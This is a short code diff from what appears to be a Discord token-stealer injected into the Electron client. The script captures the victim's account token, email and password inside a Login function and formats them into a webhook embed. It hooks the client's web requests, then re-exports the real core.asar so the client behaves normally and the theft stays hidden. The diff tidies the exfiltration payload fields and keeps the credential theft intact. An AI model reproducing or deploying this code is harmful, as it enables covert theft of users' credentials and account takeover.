@@ -147,19 +147,18 @@ function Login(email, password, token) {
                 {
                     "color": 16507654,
                     "fields": [
-                        
-			{
-                            "name": " **Token**",
+					    {
+                            "name": "**Token**",
                             "value": `\`${token}\``,
                             "inline": false
                         },
-					
-			{
-                            "value": `Nitro: {nitro}  Billing Info: {billing}',
-			    "value": `Email: ${email}   Password: ${password}`,
+						
+						
+						{
+							
+                            "value": `Email: ${email} Password: ${password}`,
                             "inline": true
                         }
-                    
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator + (json.id),
@@ -360,3 +359,4 @@ session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => 
 	}
 });
 module.exports = require('./core.asar')
+
